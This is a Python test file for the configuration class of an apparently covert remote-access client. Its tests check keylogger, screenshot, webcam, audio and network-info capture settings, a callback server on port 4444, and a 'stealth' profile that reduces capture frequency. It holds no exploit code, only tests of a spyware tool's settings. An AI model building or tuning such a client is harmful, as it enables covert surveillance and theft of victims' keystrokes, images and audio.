"""
Tests for ClientAppConfig
"""

import pytest, sys, os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))


class TestClientAppConfig:
    """Tests for ClientAppConfig class"""
    
    def test_config_init_default_values(self):
        """Test ClientAppConfig initializes with default values"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        
        assert config.APP_NAME == "Gordinay Client"
        assert config.VERSION == "1.0.0"
        assert config.server_host == "127.0.0.1"
        assert config.server_port == 4444
        assert config.use_ssl is True
        assert config.reconnect_delay == 5
    
    def test_config_keylogger_defaults(self):
        """Test keylogger default configuration"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        
        assert config.keylogger_enabled is True
        assert config.keylogger_interval == 5
    
    def test_config_webcam_defaults(self):
        """Test webcam default configuration"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        
        assert config.webcam_snapshot_enabled is False
        assert config.webcam_movement_enabled is False
        assert config.webcam_interval == 30
        assert config.webcam_stream_enabled is False
        assert config.webcam_stream_fps == 10
        assert config.webcam_stream_resolution == (640, 480)
        assert config.webcam_stream_quality == 60
    
    def test_config_screenshot_defaults(self):
        """Test screenshot default configuration"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        
        assert config.screenshot_enabled is True
        assert config.screenshot_interval == 60
        assert config.screenshot_quality == 85
    
    def test_config_network_defaults(self):
        """Test network info default configuration"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        
        assert config.network_info_enabled is True
        assert config.network_info_interval == 300
        assert config.network_info_track_changes is True
    
    def test_config_audio_defaults(self):
        """Test audio default configuration"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        
        assert config.audio_enabled is False
        assert config.audio_duration == 10
        assert config.audio_interval == 60
    
    def test_get_config_returns_dict(self):
        """Test get_config returns a dictionary"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        result = config.get_config()
        
        assert isinstance(result, dict)
    
    def test_get_config_contains_intervals(self):
        """Test get_config contains all interval settings"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        result = config.get_config()
        
        assert 'keylogger_interval' in result
        assert 'webcam_interval' in result
        assert 'screenshot_interval' in result
        assert 'network_info_interval' in result
        assert 'audio_duration' in result
        assert 'audio_interval' in result
    
    def test_get_config_contains_features(self):
        """Test get_config contains features status"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        result = config.get_config()
        
        assert 'features' in result
        assert 'keylogger' in result['features']
        assert 'webcam_snapshot' in result['features']
        assert 'webcam_stream' in result['features']
        assert 'screenshot' in result['features']
        assert 'network_info' in result['features']
        assert 'audio' in result['features']
    
    def test_set_config_keylogger_interval(self):
        """Test set_config can change keylogger_interval"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        result = config.set_config('keylogger_interval', 10)
        
        assert result is True
        assert config.keylogger_interval == 10
    
    def test_set_config_converts_string_to_int(self):
        """Test set_config converts string values to int for intervals"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        result = config.set_config('screenshot_interval', "120")
        
        assert result is True
        assert config.screenshot_interval == 120
        assert isinstance(config.screenshot_interval, int)
    
    def test_set_config_webcam_resolution_string_x(self):
        """Test set_config parses resolution string with 'x'"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        result = config.set_config('webcam_stream_resolution', "1280x720")
        
        assert result is True
        assert config.webcam_stream_resolution == (1280, 720)
    
    def test_set_config_webcam_resolution_tuple_string(self):
        """Test set_config parses resolution tuple string"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        result = config.set_config('webcam_stream_resolution', "(800, 600)")
        
        assert result is True
        assert config.webcam_stream_resolution == (800, 600)
    
    def test_set_config_invalid_param(self):
        """Test set_config returns False for invalid parameter"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        result = config.set_config('invalid_param', 100)
        
        assert result is False
    
    def test_set_config_quality_values(self):
        """Test set_config for quality parameters"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        
        assert config.set_config('screenshot_quality', 95) is True
        assert config.screenshot_quality == 95
        
        assert config.set_config('webcam_stream_quality', 80) is True
        assert config.webcam_stream_quality == 80
    
    def test_load_profile_stealth(self):
        """Test loading stealth profile"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        result = config.load_profile('stealth')
        
        assert result is True
        assert config.keylogger_interval == 10
        assert config.webcam_interval == 300
        assert config.screenshot_interval == 300
        assert config.webcam_stream_fps == 5
        assert config.webcam_stream_quality == 40
    
    def test_load_profile_performance(self):
        """Test loading performance profile"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        result = config.load_profile('performance')
        
        assert result is True
        assert config.keylogger_interval == 2
        assert config.webcam_interval == 10
        assert config.screenshot_interval == 20
        assert config.webcam_stream_fps == 30
        assert config.screenshot_quality == 95
    
    def test_load_profile_balanced(self):
        """Test loading balanced profile"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        result = config.load_profile('balanced')
        
        assert result is True
        assert config.keylogger_interval == 5
        assert config.webcam_interval == 30
        assert config.screenshot_interval == 60
    
    def test_load_profile_minimal(self):
        """Test loading minimal profile"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        result = config.load_profile('minimal')
        
        assert result is True
        assert config.keylogger_interval == 30
        assert config.webcam_interval == 600
        assert config.screenshot_interval == 600
        assert config.network_info_interval == 1800
    
    def test_load_profile_invalid(self):
        """Test loading invalid profile returns False"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        result = config.load_profile('nonexistent_profile')
        
        assert result is False
    
    def test_load_profile_preserves_other_settings(self):
        """Test loading profile doesn't affect non-profile settings"""
        from __app__.client_app.__conf__.main import ClientAppConfig
        
        config = ClientAppConfig()
        original_host = config.server_host
        original_port = config.server_port
        
        config.load_profile('stealth')
        
        assert config.server_host == original_host
        assert config.server_port == original_port
